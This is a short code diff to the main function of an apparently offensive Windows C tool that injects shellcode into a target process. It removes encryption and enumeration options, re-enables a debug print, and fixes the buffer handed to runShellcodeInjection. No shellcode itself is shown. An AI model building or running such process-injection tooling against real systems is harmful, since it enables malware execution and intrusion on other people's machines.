@@ -41,10 +41,6 @@ int main(int argc, char *argv[]) {
             injectionMethodsHelp();
         } else if (strcmp(argv[2], "payload") == 0) {
             payloadsHelp();
-        } else if (strcmp(argv[2], "encrypt") == 0) {
-            encryptionDecryptionMethodsHelp();
-        } else if (strcmp(argv[2], "enum") == 0) {
-            enumerationMethodsHelp();
         } else {
             defaultHelp(&argv[0]);
         }
@@ -61,7 +57,7 @@ int main(int argc, char *argv[]) {
     parseArguments(argc, argv, &config);
 
     // Print the configuration. For debugging purposes.
-    //printConfig(&config);
+    printConfig(&config);
 
     hNTDLLMoudle = GetModuleHandleW(L"ntdll.dll");
     if (!hNTDLLMoudle) {
@@ -93,20 +89,13 @@ int main(int argc, char *argv[]) {
             goto Cleanup;
             return 1;
         }
-        if (!runShellcodeInjection(TARGET_PROCESS, (PBYTE)payloads, payload->payloadSize)) {
+        if (!runShellcodeInjection(TARGET_PROCESS, (PBYTE)payload->payload, payload->payloadSize)) {
             handleError(ERROR_INVALID_INJECTION, "Failed to run shellcode injection");
             goto Cleanup;
             return 1;
         }
     } else {
         handleError(ERROR_INVALID_INJECTION, "Invalid injection method");
-        goto Cleanup;
-        return 1;
-    }
-
-
-    if (!enumerateAll(hNTDLLMoudle)) {
-        handleError(ERROR_INVALID_ENUMERATION, "Failed to enumerate all");
         goto Cleanup;
         return 1;
     }
